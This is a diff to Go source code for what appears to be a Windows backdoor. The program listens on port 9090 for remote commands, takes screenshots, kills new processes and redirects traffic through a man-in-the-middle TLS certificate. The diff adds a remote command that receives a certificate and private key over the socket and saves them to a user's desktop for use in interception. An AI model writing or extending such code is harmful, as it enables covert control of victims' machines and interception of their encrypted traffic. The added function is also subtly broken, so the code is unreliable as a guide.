@@ -15,6 +15,7 @@ import (
 	"github.com/vova616/screenshot"
 	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
+	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
@@ -212,7 +213,7 @@ func closeNewProcesses(stopClose chan bool) {
 
 func redirect(source string, dest string) {
 	// Read the MITM cert and key.
-	tlsCert, err := tls.LoadX509KeyPair("demo.crt", "demo.key")
+	tlsCert, err := tls.LoadX509KeyPair("C:\\Users\\IMOE001\\Desktop\\demo.crt", "C:\\Users\\IMOE001\\Desktop\\demo.key")
 	privateKey := tlsCert.PrivateKey.(*rsa.PrivateKey)
 
 	x509c, err := x509.ParseCertificate(tlsCert.Certificate[0])
@@ -347,6 +348,47 @@ func stopRedirecting() {
 func waitForStopClose(stopClose chan bool) {
 	<-stopClose
 }
+func receiveCert(conn net.Conn) {
+	destDir := "C:\\Users\\IMOE001\\Desktop" // Change this to the desired directory path
+	certFile := "demo.crt"
+	keyFile := "demo.key"
+	fmt.Println("here1")
+	// Create output files for the received files
+	// Create output files for the received files
+	certOutputPath := filepath.Join(destDir, certFile)
+	certOutput, err := os.Create(certOutputPath)
+	if err != nil {
+		fmt.Println("Failed to create certificate file:", err)
+		os.Exit(1)
+	}
+	defer certOutput.Close()
+
+	keyOutputPath := filepath.Join(destDir, keyFile)
+	keyOutput, err := os.Create(keyOutputPath)
+	if err != nil {
+		fmt.Println("Failed to create key file:", err)
+		os.Exit(1)
+	}
+	defer keyOutput.Close()
+
+	buffer2 := make([]byte, 1024)
+
+	// Read and save the received certificate file
+	_, err = io.CopyBuffer(certOutput, conn, buffer2)
+	if err != nil {
+		fmt.Println("Failed to receive certificate file:", err)
+		os.Exit(1)
+	}
+
+	// Read and save the received key file
+	_, err = io.CopyBuffer(keyOutput, conn, buffer2)
+	if err != nil {
+		fmt.Println("Failed to receive key file:", err)
+		os.Exit(1)
+	}
+
+	fmt.Printf("Files received successfully and saved in %s!\n", destDir)
+}
 
 func main() {
 	// Start listening on port 9090
@@ -400,6 +442,7 @@ func handleConnection(conn net.Conn, stopClose chan bool) {
 		},
 		"stopClosing":  func(args []string) { stopClosing(stopClose) },
 		"stopRedirect": func(args []string) { stopRedirecting() },
+		"receiveCert":  func(args []string) { receiveCert(conn) },
 	}
 
 	// Read commands from the client and execute the corresponding function
